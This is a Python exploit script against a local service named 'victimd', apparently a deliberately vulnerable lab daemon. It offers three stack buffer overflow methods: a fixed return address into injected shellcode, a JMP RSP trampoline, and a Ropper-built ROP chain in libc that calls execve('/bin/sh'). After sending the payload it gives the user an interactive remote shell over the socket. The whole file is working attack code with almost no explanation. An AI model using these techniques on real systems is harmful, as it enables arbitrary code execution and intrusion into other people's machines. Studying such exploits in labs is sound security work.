#!/usr/bin/env python3


import socket
import struct
import sys

from argparse import ArgumentParser
from ropper import RopperService


def build_exploit_string_with_fixed_address(shellcode: bytes, buffer_size: int, buffer_addr: int) -> bytes:
    # exploit string writes 8 periods to terminate the loop in victimd, then the shellcode,
    # it then overwrites the remaining buffer + saved RBP and finally the return address
    # with the address of the buffer + 8 (to skip the periods)
    # victimd must have been compiled with the `-z execstack` option
    return b"........" + shellcode + b"." * (buffer_size - len(shellcode)) + struct.pack("<Q", buffer_addr + 8) + b"\n"


def build_exploit_string_with_jmp_rsp(shellcode: bytes, buffer_size: int, addr_of_jmp_rsp: int) -> bytes:
    # exploit string overwrites complete buffer + saved RBP with periods, then overwrites the
    # return address with the address of the JMP RSP instruction and writes the shellcode
    # victimd must have been compiled with the `-z execstack` option
    return b"." * (buffer_size + 8) + struct.pack("<Q", addr_of_jmp_rsp) + shellcode + b"\n"


def build_exploit_string_with_rop_chain(buffer_size: int, libc_fname: str, libc_base_addr: int) -> bytes:
    rs = RopperService({})
    rs.addFile(libc_fname)
    rs.setImageBaseFor(name=libc_fname, imagebase=libc_base_addr)

    # exploit string overwrites complete buffer + saved RBP with periods, then writes the ROP chain
    # The addresses apply to version 2.30 of libc on a Debian 11 system. Setting argv and envp
    # to NULL is undocumented but works anyway and makes our live much easier. Otherwise we would
    # have to construct the arrays somewhere, e. g. on the stack or in the data segment, and pass
    # pointers to them to execve().
    return b"".join((
        b"." * (buffer_size + 8),
        struct.pack("<Q", rs.searchInstructions("pop rax; ret")[libc_fname][0].address),
        struct.pack("<Q", 59),                           # RAX = system call number = sys_execve
        struct.pack("<Q", rs.searchInstructions("pop rdi; ret")[libc_fname][0].address),
        struct.pack("<Q", libc_base_addr + 0x001881ac),  # RDI = address of the string '/bin/sh'
        struct.pack("<Q", libc_base_addr + 0x00026cf7),  # address of 'pop rsi; ret', for some reason Ropper can't find these instructions
        struct.pack("<Q", 0),                            # RSI = argv
        struct.pack("<Q", rs.searchInstructions("pop rdx; ret")[libc_fname][0].address),
        struct.pack("<Q", 0),                            # RDX = envp
        struct.pack("<Q", rs.searchInstructions("syscall")[libc_fname][0].address),
        b"\n"
    ))


def main():
    ap = ArgumentParser()
    ap.add_argument("--method", "-m", required=True, choices=("fixed-addr", "jmp-rsp", "rop-chain"), help="exploit method")
    ap.add_argument("--buffer-size", "-s", required=True, type=int, help="size of buffer to overflow")
    ap.add_argument("--address", "-a", required=True, help="address of buffer / JMP RSP instruction / base address of libc, depending on the method")
    ap.add_argument("--fname", "-f", required=True, help="name of the file containing the shellcode / library the gadgets are taken from")
    args = ap.parse_args()

    if args.method != "rop-chain":
        with open(args.fname, "rb") as f:
            shellcode = f.read()

    s = socket.create_connection(("127.0.0.1", 9999))
    if args.method == "fixed-addr":
        str_of_death = build_exploit_string_with_fixed_address(shellcode, args.buffer_size, int(args.address, 16))
    elif args.method == "jmp-rsp":
        str_of_death = build_exploit_string_with_jmp_rsp(shellcode, args.buffer_size, int(args.address, 16))
    elif args.method == "rop-chain":
        str_of_death = build_exploit_string_with_rop_chain(args.buffer_size, args.fname, int(args.address, 16))

    input("press any key to start exploit... ")
    s.send(str_of_death)
    while True:
        cmd = input("> ")
        if cmd == ".":
            break
        s.send(cmd.encode() + b"\n")
        # TODO: add timeout and check for empty response / errors
        print(s.recv(4096).decode("ascii", "ignore"))
    s.close()


if __name__ == "__main__":
    main()